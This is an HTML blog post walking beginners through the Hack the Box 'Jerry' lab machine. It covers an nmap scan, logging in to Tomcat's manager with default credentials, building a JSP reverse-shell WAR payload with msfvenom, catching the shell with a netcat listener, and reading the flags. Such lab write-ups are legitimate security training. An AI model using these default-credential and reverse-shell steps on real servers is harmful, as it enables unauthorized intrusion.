

<!DOCTYPE html>
<html lang="en" data-mode="dark">
  <head prefix="og: http://ogp.me/ns#">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="generator" content="Hugo 0.80.0 -- gohugo.io / Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
























<title>Walkthrough of Jerry Machine – Hack the Box | Somerset&#39;s Blog</title>


<meta name="author" content="Somerset">



<meta name="robots" content="index follow">
<meta name="referrer" content="no-referrer-when-downgrade">




  
    <link rel="canonical" href="https://s0merset7.github.io/posts/jerry_machine/">
  








<meta property="og:site_name" content="Somerset&#39;s Blog">
<meta property="og:title" content="Walkthrough of Jerry Machine – Hack the Box">

  <meta property="og:url" content="https://s0merset7.github.io/posts/jerry_machine/">








  <meta property="og:type" content="article">
  
  
    <meta property="article:published_time" content="2020-08-23">
    <meta property="article:modified_time" content="2020-08-23">
    <meta property="og:updated_time" content="2020-08-23">
  

  
  
  
    <meta name="twitter:creator" content="@s0merset7">
  
  

  <meta name="twitter:site" content="@s0merset7">







  <meta name="twitter:dnt" content="on">












<meta name="theme-color" content="#222">

<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">










  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    
    
      
      
    

  

    
    

    

      
        
      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
        
      
      
    

  

    
    

    
    
      
      
    

  

    
    

    
    
      
      
    

  

    
    

    

      
      
    

  

    
    

    
    
      
      
    

  

    
    

    
    
      
      
    

  

    
    

    

      
      
    

  

    
    

    
    
      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
        
      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  

    
    

    

      
      
    

  







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Article",
      "mainEntityOfPage": {
        "@type": "WebSite",
        "@id": "https:\/\/s0merset7.github.io\/"
      },
      "headline": "Walkthrough of Jerry Machine – Hack the Box",
      "description": "",
      
      "url": "https:\/\/s0merset7.github.io\/posts\/jerry_machine\/",
      "inLanguage": "en",
      "datePublished": "2020-08-23",
      "dateModified": "2020-08-23",
      "wordCount" : "1655",
      "publisher": {
        "@type": "Person",
        "name": "Somerset"
      },
      "author": {
        "@type": "Person",
        "name": "Somerset",
        "description": "Cybersecuirty enthusiast learning what I can",
        "sameAs": ["https://github.com/s0merset7","https://www.linkedin.com/in/ryan-dinnan","https://twitter.com/s0merset7"]
      }
    }
  </script>






<link rel="stylesheet" href="/css/main.min.46f9974dbd84e826ea113220f8fa8b1b862024b9588a4940f415ca16bc4e38fb7f345fb5e8881f7e5680d1237f05d359208acd0a4344e76fea4a90135f604c06.css" integrity="sha512-RvmXTb2E6CbqETIg&#43;PqLG4YgJLlYiklA9BXKFrxOOPt/NF&#43;16IgfflaA0SN/BdNZIIrNCkNE52/qSpATX2BMBg==">



<noscript>

  
  

  

    
      <meta name="theme-color" content="#902b37">
    

  

  <style>
  
    html {
      --accent: #902b37;
    }
  
    .req-js,
    img.lazyload {
      display: none;
    }
    
  </style>
  
</noscript>






  <link rel="preload" href="/fonts/open-sans-v17-latin-700.woff" as="font" crossorigin="anonymous">

  <link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">

  <link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff" as="font" crossorigin="anonymous">

  <link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">

  <link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff" as="font" crossorigin="anonymous">

  <link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">

  <link rel="preload" href="/fonts/oswald-v29-latin-700.woff" as="font" crossorigin="anonymous">

  <link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">





<script defer src="/js/lazysizes.min.min.a85a0eccaf9ef0d2f083a9dc4d0e05dc90acc5be0e84b43e20fde692871e1861ae0191f7c3ca2c00f2664efabf6aff2625a478b8f22ea43cb056cb6ec9a8d948.js" crossorigin="anonymous"></script>








  <link rel="me" href="https://github.com/s0merset7"> 

  <link rel="me" href="https://www.linkedin.com/in/ryan-dinnan"> 

  <link rel="me" href="https://twitter.com/s0merset7"> 







  <script>
    
      'use strict';const ROOT=document.documentElement;const SHEET=document.documentElement.style;const META_THEME_COLOR=document.querySelector('meta[name=theme-color]');function setDark(){ROOT.dataset.mode='dark'};function setLight(){ROOT.dataset.mode='light'};if(localStorage.getItem('isDark')=='true'){setDark()}else if(localStorage.getItem('isDark')=='false'){setLight()};function getAccent(){if(ROOT.dataset.mode==='dark'){if(localStorage.getItem('darkAccent')===null){var currentAccent="#902b37"}else{var currentAccent=localStorage.getItem('darkAccent')
}}else if(ROOT.dataset.mode==='light'){if(localStorage.getItem('lightAccent')===null){var currentAccent="#225670"}else{var currentAccent=localStorage.getItem('lightAccent')
}};return currentAccent};var activeAccent=getAccent();SHEET.setProperty('--accent',activeAccent);META_THEME_COLOR.setAttribute('content',activeAccent);function updateAccent(){var activeAccent=getAccent();SHEET.setProperty('--accent',activeAccent);PALETTE.value=activeAccent;META_THEME_COLOR.setAttribute('content',activeAccent);};document.addEventListener('DOMContentLoaded',function(){PALETTE.value=activeAccent;function smoothTransition(){document.body.style.transition=document.querySelector('header').style.transition=document.querySelector('footer').style.transition='background-color .3s ease, color .3s ease'};function userModeChange(){smoothTransition();if(ROOT.dataset.mode=='light'){setDark();localStorage.setItem('isDark','true')
}else{setLight();localStorage.setItem('isDark','false')
};updateAccent()};document.querySelector('footer button').addEventListener('click',userModeChange)})
    
  </script>



  </head>

  <body>

    <header>
      

  <a href="/">Somerset&#39;s Blog</a>




  
    <nav aria-label="Main menu.">
      <ul>
        
          <li>
            <a class="btn" href="/about/">About</a>
          </li>
        
          <li>
            <a class="btn" href="/posts/">Posts</a>
          </li>
        
          <li>
            <a class="btn" href="/contact/">Contact</a>
          </li>
        
      </ul>
    </nav>
  


    </header>

    <div class="filler">
      

  <main>
    <article>
      <header>
        
        <h1>Walkthrough of Jerry Machine – Hack the Box</h1>
        
        

        
          <section class="terms">
            <ul><li><a class="btn" href="/tags/hackthebox/">HacktheBox</a></li><li><a class="btn" href="/tags/walkthrough/">Walkthrough</a></li></ul>
          </section>
          <p>
            
              Published on <time datetime="2020-08-23">2020-08-23</time>
            
          </p>
        
        
        
        
      </header>
    
      
      
      





















  




<style>
	main {
    margin: 90px auto;
    padding: 0 15px;
    max-width: 70%;
	}
</style>
<ol>
<li>In a new terminal window, run <code>nmap -sC -sV 10.10.10.95</code>
<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> <code>-sC</code>: Adds on the &ldquo;default&rdquo; scripts to be run which include things like &ldquo;Speed&rdquo;, &ldquo;usefulness&rdquo;, and &ldquo;Intrusiveness&rdquo;. You can check them out in more detail by looking under <em>&ldquo;default&rdquo;</em> in the <strong>Script Categories</strong> section on <a href="https://nmap.org/book/nse-usage.html">this website</a>
<br><input disabled="" type="checkbox"> <code>-sV</code>: Probe open ports to determine service/version info











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194000-0d2d2600-dd7b-11ea-95bb-7876faf2f160.png"
      alt="image"
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194000-0d2d2600-dd7b-11ea-95bb-7876faf2f160.png"
        alt="image"
      />
    </noscript>
  
  

</li>
<li>It looks like we only have one open port (8080) and it&rsquo;s running a service called <strong>Apache Tomcat/Coyote JSP engine 1.1</strong></li>
<li>If we do a little research we find out a few things:
<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> <strong>Apache Tomcat</strong> is <a href="https://en.wikipedia.org/wiki/Apache_Tomcat">a &ldquo;pure Java&rdquo; HTTP web server environment in which Java code can run</a>
<br><input disabled="" type="checkbox"> <strong>Coyote</strong> <a href="https://en.wikipedia.org/wiki/Apache_Tomcat#Coyote">is a Connector component for Tomcat that supports the HTTP 1.1 protocol as a web server</a></li>
<li>Being that <strong>Apache Tomcat</strong> (or <strong>Tomcat</strong> for short) provides a web-server environment, we can actually go to the website and see it.</li>
<li>Let&rsquo;s check it out by going to <em>http://10.10.10.95:8080</em>
<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> This URL works because we know from the portscan that <strong>Tomcat</strong> is an http service, so we add the <em>&ldquo;http://&quot;</em> at the beginning followed by the HTB IP address, and then the <em>&quot;:8080&rdquo;</em> allows us to specify the port number. All of this works together to say we want to go to the IP address <em>10.10.10.95</em> via an <em>http</em> connection at port <em>8080</em></li>
<li>Once we get there we can see a few things:











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194129-6301ce00-dd7b-11ea-9ced-6de716eaae9f.png"
      alt="image"
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194129-6301ce00-dd7b-11ea-9ced-6de716eaae9f.png"
        alt="image"
      />
    </noscript>
  
  

</li>
<li>If we explore around, most of the clickable options redirect us to help pages for how to use <strong>Tomcat</strong>, with the exception of the <em>Server Status</em>, <em>Manager App</em>, and <em>Host Manager</em>. If we click on any of those three we get this pop-up:











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194521-5d58b800-dd7c-11ea-83e6-e5d31cadc18c.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194521-5d58b800-dd7c-11ea-83e6-e5d31cadc18c.png"
        
      />
    </noscript>
  
  

</li>
<li>So it&rsquo;s asking us for credentials that we don&rsquo;t know. Before trying to set up any complicated password breaking attacks, I find it a good idea to try at least a few of the basics. Some of these include <em>admin:admin</em>, <em>admin:password</em>, <em>admin:pass</em>, etc, (where <em>admin</em> stands for <em>administrator</em> in the hopes that with these credentials we can log into the account with the most privileges</li>
<li>If we try <em>admin:admin</em> on the <em>Server Status</em> feature it works! And we end up looking at a page like this:











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194585-7e210d80-dd7c-11ea-841d-bdb63ee97243.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194585-7e210d80-dd7c-11ea-841d-bdb63ee97243.png"
        
      />
    </noscript>
  
  

</li>
<li>This page has a bunch of information about <strong>Tomcat</strong> and this particular server it&rsquo;s running on. Unfortunately, aside from telling us a little bit more about the server, it doesn&rsquo;t help us get any closer finding a vulnerability</li>
<li>Lets go back and try a different option to see if we can find something more useful. If we go back to the main page and click on <em>Manager App</em> however, we get this 403 error message (you may have also gotten a similar 401 error message earlier if you had clicked <em>Cancel</em> or exited out of the username password prompt):
<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> The 401 error is a result of the website thinking we are attempting to access a page without giving credentials when we exit out of the login pop-up, and the 403 error is when we are logged in with credentials, but then try and access a page that we don&rsquo;t have privileges to











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194659-985aeb80-dd7c-11ea-9e8a-7baee5498d7c.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194659-985aeb80-dd7c-11ea-9e8a-7baee5498d7c.png"
        
      />
    </noscript>
  
  

</li>
<li>This error message is very interesting though, if we read it, we find that it gives us instructions on how to set up a manager account, with example credentials <em>tomcat:s3cret</em>. Now what often happens is that people will follow these instructions exactly (same way you might go about changing a password for a website), however, if the service doesn&rsquo;t check for (or the user doesn&rsquo;t remember to change) the example credentials, then we may be able to use them to sign into our administrator account</li>
<li>To be able to try this new idea though, we first need to be able to get our pop-up back to retry our credentials, and as you probably noticed, <strong>Tomcat</strong> will only show us error messages instead. To fix this, we need to go to <em>Preferences</em> -&gt; <em>Privacy &amp; Security</em> -&gt; <em>History</em> and clear our history (there should be options as to how far back you want to erase your history if you don&rsquo;t want to delete everything):











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194719-bd4f5e80-dd7c-11ea-8481-5a6832331cfd.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194719-bd4f5e80-dd7c-11ea-8481-5a6832331cfd.png"
        
      />
    </noscript>
  
  


<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> The reason this works, is because every time we attempt to log in, the website takes our credentials, encodes them, and puts them in what&rsquo;s called a &ldquo;header&rdquo;. This header is read by the website and if it matches the proper credentials, then it will allow us to access the content. If it doesn&rsquo;t match, then the website will react with an error message. Most browsers save our most recent credentials or headers on websites, so by clearing our history, we can clear them which allows us to try again.</li>
<li>Once we&rsquo;ve done that, we can go back, click on <em>Manager App</em> and our pop-up is back!</li>
<li>If we try <em>tomcat:s3cret</em> it works and we get this page:











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194758-d35d1f00-dd7c-11ea-808c-aef11f8837b5.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194758-d35d1f00-dd7c-11ea-808c-aef11f8837b5.png"
        
      />
    </noscript>
  
  

</li>
<li>If we explore around a little we&rsquo;ll find a section called <em>&ldquo;WAR file to deploy&rdquo;</em>, and this is what we&rsquo;re going to want to look at, because chances are if we have the ability to upload something, we can make that something do what we want











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194805-ecfe6680-dd7c-11ea-8743-f0b840a6c14c.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194805-ecfe6680-dd7c-11ea-8743-f0b840a6c14c.png"
        
      />
    </noscript>
  
  


<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> So what even is a WAR file?
<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> A WAR (Web Application Resource) file is like a ZIP file in the sense that it is actually a collection of other files compressed together. However unlike ZIP files, WAR files are comprised solely of <a href="https://en.wikipedia.org/wiki/JAR_(file_format)">JAR</a> files meant to hold resources to create a website</li>
<li>Now before we start trying to write our own WAR file, lets check if we have any tools that might have something already written</li>
<li>One way we can check is by using a program called <strong>MsfVenom</strong>, a payload generator for <strong>Metasploit</strong></li>
<li>Since we know WAR files are a collection of JSP/Java files, lets see what payload options  <strong>MsfVenom</strong> has with <code>msfvenom -l payloads | grep java</code>
<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> The <code>msfvenom -l payloads</code> will list all of the payloads <strong>MsfVenom</strong> can produce, but since there are so many we&rsquo;ll want to reduce our results by pipelining the results through <code>grep java</code> which filters all the results and shows us only the ones with the word &ldquo;java&rdquo; in it











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90194897-1ae3ab00-dd7d-11ea-8596-af7405e332d4.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90194897-1ae3ab00-dd7d-11ea-8596-af7405e332d4.png"
        
      />
    </noscript>
  
  

</li>
<li>Taking a look at these results, we can narrow it down by figuring out what else we want, JSP (because it&rsquo;s a WAR file), a reverse shell (check out the first bit of <a href="https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9">this article</a> to understand why), and a tcp connection (as we determined from our portscan). This leaves us with the <em>&ldquo;java/jsp_shell_reverse_tcp&rdquo;</em> option</li>
<li>To create our WAR file to upload to <strong>Tomcat</strong>, we&rsquo;ll run <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=yourHtbIp LPORT=openPort -f war &gt; aName.war</code>. Now that&rsquo;s a big command with a lot of fill-in-the-blanks so let&rsquo;s break it down:
<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> <code>msfvenom</code>: We are using <strong>MsfVenom</strong> to create our program and this calls it
<br><input disabled="" type="checkbox"> <code>-p java/jsp_shell_reverse_tcp</code>: This indicates that we want to create a <ins><strong>p</strong></ins>ayload in <em>java</em> that will create a <em>JSP Reverse Shell</em> using a <em>TCP</em> connection
<br><input disabled="" type="checkbox"> <code>LHOST=yourHtbIp</code>: Setting the local host by replacing &ldquo;yourHtbIp&rdquo; with your Hack the Box IP (can be found in the <strong>Access</strong> tab when signed into your HTB account)
<br><input disabled="" type="checkbox"> <code>LPORT=openPort</code>: Setting the port to be used for the reverse shell connection
<br><input disabled="" type="checkbox"> <code>-f war</code>: Setting the <ins><strong>f</strong></ins>ormat of the payload to be a WAR file
<br><input disabled="" type="checkbox"> <code>&gt; aName.war</code>: Replace &ldquo;aName&rdquo; with whatever you want to name your payload file</li>
<li>You&rsquo;ll want to run your version of the command, and after a few moments you&rsquo;ll get a message saying the size of the file, and if we type <code>ls</code> we can see our file!











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90195123-8d548b00-dd7d-11ea-8e9f-ab9c211396e3.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90195123-8d548b00-dd7d-11ea-8e9f-ab9c211396e3.png"
        
      />
    </noscript>
  
  

</li>
<li>So let&rsquo;s go ahead and upload our WAR file to <strong>Tomcat</strong> by clicking <em>&ldquo;Browse&rdquo;</em> in the <em>&ldquo;WAR file to deploy&rdquo;</em> section, and once we see our file in there, click <em>&ldquo;Deploy&rdquo;</em>











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90195193-ad844a00-dd7d-11ea-8818-d64676277795.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90195193-ad844a00-dd7d-11ea-8818-d64676277795.png"
        
      />
    </noscript>
  
  

</li>
<li>If you did it right, you should see your file sorted in alphabetically with the other preexisting files:











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90195220-bbd26600-dd7d-11ea-9d35-9c0a13684bc1.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90195220-bbd26600-dd7d-11ea-9d35-9c0a13684bc1.png"
        
      />
    </noscript>
  
  

</li>
<li>Before we do anything with it though, since we learned a Reverse Shell relies on a &ldquo;listener&rdquo; running on our device for our victim to connect to with a shell, we need to set up a listener with <code>nc -lvnp yourLPORT</code>
<br><input disabled="" type="checkbox"> <code>-lvnp</code> is short for <code>-l -v -n -p</code> and specifies four things:
<br><div style="padding-left: 2em;"><input disabled="" type="checkbox"> <code>-l</code>: Listen for incoming traffic
<br><input disabled="" type="checkbox"> <code>-v</code>: Be verbose (give details of what is going on in the process)
<br><input disabled="" type="checkbox"> <code>-n</code>: No DNS lookups are required (it saves time and makes the command simpler)
<br><input disabled="" type="checkbox"> <code>-p</code>: Specifies a specific port to be listening on (which is why you need to put an open port after to be listening on)</li>
<li>Once we do that, we should get this response showing that our &ldquo;listener&rdquo; is ready











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90195262-d86e9e00-dd7d-11ea-8a05-c4e79114cbe1.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90195262-d86e9e00-dd7d-11ea-8a05-c4e79114cbe1.png"
        
      />
    </noscript>
  
  

</li>
<li>Let&rsquo;s go ahead and activate our WAR file by clicking on it in <strong>Tomcat</strong>, and if we check our listener, we have a shell!











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90195317-f50ad600-dd7d-11ea-89fa-bb44e930cd29.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90195317-f50ad600-dd7d-11ea-89fa-bb44e930cd29.png"
        
      />
    </noscript>
  
  

</li>
<li>Since we&rsquo;re in a new shell, we&rsquo;ll want to check out the <em>help</em> page to see what the commands are by running <code>help</code>











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90195340-0522b580-dd7e-11ea-935d-8235bb2c27dc.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90195340-0522b580-dd7e-11ea-935d-8235bb2c27dc.png"
        
      />
    </noscript>
  
  

</li>
<li>We can see all of the commands and what they do in this shell, the main ones that concern us will be that the command <code>dir</code> replaces <code>ls</code> and <code>cat</code> is replaced with <code>type</code></li>
<li>If we navigate around using these commands, we&rsquo;ll find a file in <em>Users/Administrator/Desktop/flags</em> called <em>&ldquo;2 for the price of 1.txt&rdquo;</em>











  






  
  
    <img
      class="lazyload "
      loading="lazy"
      src="data:image/gif;base64,R0lGODdhAQABAIABAICAgDfSzywAAAAAAQABAAACAkQBADs="
      data-src="https://user-images.githubusercontent.com/44144070/90195404-25eb0b00-dd7e-11ea-9184-ac1fbf931ffc.png"
      
    />
    
    <noscript>
      <img
        
        loading="lazy"
        src="https://user-images.githubusercontent.com/44144070/90195404-25eb0b00-dd7e-11ea-9184-ac1fbf931ffc.png"
        
      />
    </noscript>
  
  

</li>
<li>If we run <code>type &quot;2 for the price of 1.txt&quot;</code>, then we can see our user and root hashes and enter them to get our points!</li>
</ol>





  <h2 id="resources">Resources <a class="anchor" href="#resources" title='Anchor for "Resources".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a></h2> 

<ul>
<li><a href="https://www.hackthebox.eu/home/machines/writeup/144">Official Jerry Writeup from Hack the Box</a></li>
<li><a href="https://youtu.be/PJeBIey8gc4">Jerry Video Tutorial from IppSec</a></li>
<li><a href="https://0xrick.github.io/hack-the-box/jerry/">Jerry Write-Up by 0xRick</a></li>
<li><a href="https://nmap.org/book/man-briefoptions.html"><code>nmap</code> Command Help</a></li>
<li><a href="https://en.wikipedia.org/wiki/Apache_Tomcat">Information on Apache Tomcat</a></li>
<li><a href="https://www.varonis.com/blog/netcat-commands/">Information on NetCat Commands</a></li>
<li><a href="https://en.wikipedia.org/wiki/WAR_(file_format)">Information on WAR files</a></li>
</ul>





  <h6 id="font-size178-97-39-77-104-111-105-39-67-104-98-32-116-39-111-98-102-99-39-116-119-107-110-115-116-39-104-119-98-105-39-102-105-99-39-102-39-82-65-72-39-116-111-104-114-107-99-39-97-107-126-39-104-114-115-43-39-78-39-112-102-105-115-39-126-104-114-39-115-104-39-111-102-113-98-39-98-127-119-98-100-115-98-99-39-110-115font"><font size="1">78 97 39 77 104 111 105 39 67 104 98 32 116 39 111 98 102 99 39 116 119 107 110 115 116 39 104 119 98 105 39 102 105 99 39 102 39 82 65 72 39 116 111 104 114 107 99 39 97 107 126 39 104 114 115 43 39 78 39 112 102 105 115 39 126 104 114 39 115 104 39 111 102 113 98 39 98 127 119 98 100 115 98 99 39 110 115</font> <a class="anchor" href="#font-size178-97-39-77-104-111-105-39-67-104-98-32-116-39-111-98-102-99-39-116-119-107-110-115-116-39-104-119-98-105-39-102-105-99-39-102-39-82-65-72-39-116-111-104-114-107-99-39-97-107-126-39-104-114-115-43-39-78-39-112-102-105-115-39-126-104-114-39-115-104-39-111-102-113-98-39-98-127-119-98-100-115-98-99-39-110-115font" title='Anchor for "78 97 39 77 104 111 105 39 67 104 98 32 116 39 111 98 102 99 39 116 119 107 110 115 116 39 104 119 98 105 39 102 105 99 39 102 39 82 65 72 39 116 111 104 114 107 99 39 97 107 126 39 104 114 115 43 39 78 39 112 102 105 115 39 126 104 114 39 115 104 39 111 102 113 98 39 98 127 119 98 100 115 98 99 39 110 115".'><svg aria-hidden="true"><use xlink:href="#hashtag"/></svg></a></h6> 




    </article>
  </main>


    </div>
    
    <footer>
      

  <p>Copyright © 2021
All rights reserved</p>












<section class="req-js">
  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#902b37" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#225670"><option value="#902b37"><option value="#1f676b"><option value="#f3a530"><option value="#dd587c"><option value="#1dbc91"><option value="#754e85"><option value="#7fc121"><option value="#a8314a"><option value="#ff7433"><option value="#3e6728"><option value="#c063bd"></datalist>
</section>



  <noscript>
    <p class="noscript">Unable to execute JavaScript. Some features were disabled.</p>
  </noscript>



    </footer>
    
    <svg xmlns="http://www.w3.org/2000/svg" width="0" height="0" aria-hidden="true">
      <symbol viewBox="0 0 512 512" id="adjust">
        <path d="M8 256c0 136.966 111.033 248 248 248s248-111.034 248-248S392.966 8 256 8 8 119.033 8 256zm248 184V72c101.705 0 184 82.311 184 184 0 101.705-82.311 184-184 184z"/>
      </symbol>
      
      
      
      
  
<symbol viewBox="0 0 448 512" id="hashtag">
  <path d="M440.667 182.109l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l14.623-81.891C377.123 38.754 371.468 32 363.997 32h-40.632a12 12 0 0 0-11.813 9.891L296.175 128H197.54l14.623-81.891C213.477 38.754 207.822 32 200.35 32h-40.632a12 12 0 0 0-11.813 9.891L132.528 128H53.432a12 12 0 0 0-11.813 9.891l-7.143 40C33.163 185.246 38.818 192 46.289 192h74.81L98.242 320H19.146a12 12 0 0 0-11.813 9.891l-7.143 40C-1.123 377.246 4.532 384 12.003 384h74.81L72.19 465.891C70.877 473.246 76.532 480 84.003 480h40.632a12 12 0 0 0 11.813-9.891L151.826 384h98.634l-14.623 81.891C234.523 473.246 240.178 480 247.65 480h40.632a12 12 0 0 0 11.813-9.891L315.472 384h79.096a12 12 0 0 0 11.813-9.891l7.143-40c1.313-7.355-4.342-14.109-11.813-14.109h-74.81l22.857-128h79.096a12 12 0 0 0 11.813-9.891zM261.889 320h-98.634l22.857-128h98.634l-22.857 128z"/>
</symbol>


  <symbol viewBox="0 0 320 512" id="caret-down">
    <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"/>
  </symbol>


      
      
      
    </svg>

    
    
    

      <script>
        
          'use strict';const PALETTE=document.querySelector('footer input');PALETTE.onchange=function(){const PICK=PALETTE.value;SHEET.setProperty('--accent',PICK);if(ROOT.dataset.mode==='light'){localStorage.setItem('lightAccent',PICK)}else{localStorage.setItem('darkAccent',PICK)};updateAccent()};
        
      </script>

    
    
    
    

  </body>
</html>
